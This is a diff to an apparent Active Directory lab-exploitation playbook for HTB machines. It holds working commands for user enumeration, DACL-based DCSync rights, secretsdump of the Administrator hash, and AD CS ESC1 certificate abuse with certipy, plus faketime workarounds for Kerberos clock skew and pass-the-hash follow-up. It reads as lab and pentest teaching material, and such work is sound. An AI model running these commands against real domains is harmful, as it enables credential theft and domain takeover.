@@ -10,13 +10,18 @@ pwnloop x "impacket-lookupsid anonymous@$T"              # user enumeration via 
 pwnloop x "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='MACHINE.HTB',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $T"
 ```
 
-Time skew breaks Kerberos. Sync to the DC if you see `KRB_AP_ERR_SKEW`:
+Time skew breaks Kerberos. **Do not try to set the container's clock** — it has
+no `CAP_SYS_TIME`, the clock belongs to the host kernel, and `ntpdate -u` will
+measure the offset and then fail with `step_systime: Operation not permitted`.
+Measure with `-q`, then shim the single process that needs it:
+
 ```bash
-pwnloop x "ntpdate -u $T"          # ntpsec-ntpdate; the container has NET_ADMIN
-pwnloop x "date -s \"\$(date -d \"\$(rdate -p -n $T)\" -u +'%Y-%m-%d %H:%M:%S')\""   # fallback
+pwnloop x "ntpdate -q $T"                                  # read the offset only
+pwnloop x "faketime \"\$(date -u -d '+7 hours 59 minutes 55 seconds' '+%F %T')\" <cmd>"
 ```
-If neither works, wrap the impacket call in `faketime` rather than fighting the
-container clock.
+
+See the AD CS section below for the worked example — PKINIT is where this stops
+being an annoyance and starts being a blocker.
 
 ## AS-REP roasting (no creds needed, just usernames)
 
@@ -75,8 +80,9 @@ impacket-dacledit -action write -rights DCSync -principal myuser \
 impacket-secretsdump 'dom/myuser:pass'@$T -just-dc-user Administrator
 ```
 
-Prefer NTLM/password auth here. Kerberos adds `KRB_AP_ERR_SKEW` (DC clock drift);
-if you must use it, `ntpdate -u $T` first, in the *same* invocation as the action.
+Prefer NTLM/password auth here. Kerberos adds `KRB_AP_ERR_SKEW` (DC clock drift),
+and when it is unavoidable the fix is a `faketime` shim on that one command — not
+`ntpdate -u`, which cannot step the container's clock. See above.
 
 Common ACL abuses:
 - `ForceChangePassword` on a user → reset their password with `net rpc password`
@@ -108,3 +114,37 @@ pwnloop x "certipy auth -pfx administrator.pfx -dc-ip $T"
 ```
 ESC1 (enrollee-supplied subject) and ESC8 (NTLM relay to the web enrollment
 endpoint) are the ones most often planted in labs.
+
+**The signal that AD CS is worth checking** is `BUILTIN\Certificate Service
+DCOM Access` appearing in a user's `whoami /all` output. Read the group list of
+every Windows account you land as.
+
+**ESC1 is four settings that must all be true** — confirm them in the
+`certipy find` output rather than trusting the `[!] ESC1` tag: `Enrollee
+Supplies Subject : True`, an EKU containing `Client Authentication`,
+`Requires Manager Approval : False`, and enrolment rights held by a group you
+are in (`Domain Users` is the give-away).
+
+**`certipy auth` is PKINIT, so it is Kerberos, so clock skew kills it.**
+`KRB_AP_ERR_SKEW` here is not a broken exploit. The container cannot step its
+own clock (no `CAP_SYS_TIME` — the clock is the host kernel's), so `ntpdate -u`
+fails with `step_systime: Operation not permitted`. Measure, then shim one
+process:
+
+```bash
+pwnloop x "ntpdate -q $T"                     # read the offset, e.g. +28794 s
+pwnloop x "faketime \"\$(date -u -d '+7 hours 59 minutes 55 seconds' '+%F %T')\" \
+  certipy-ad auth -pfx administrator.pfx -dc-ip $T"
+```
+
+That returns a TGT and the account's NT hash; pass it to `evil-winrm -H` or
+`netexec -H`. The certificate remains valid for its full lifetime regardless of
+password resets, so **revoke it during cleanup** — request ID alone is not
+accepted, `certutil -revoke` wants the serial:
+
+```powershell
+certutil -view -restrict "RequestId=<id>" -out "SerialNumber"
+certutil -revoke <serial> 4                     # 4 = superseded
+certutil -view -restrict "RequestId=<id>" -out "RequestId,Request.Disposition"
+# verify: Request Disposition: 0x15 (21) -- Revoked
+```
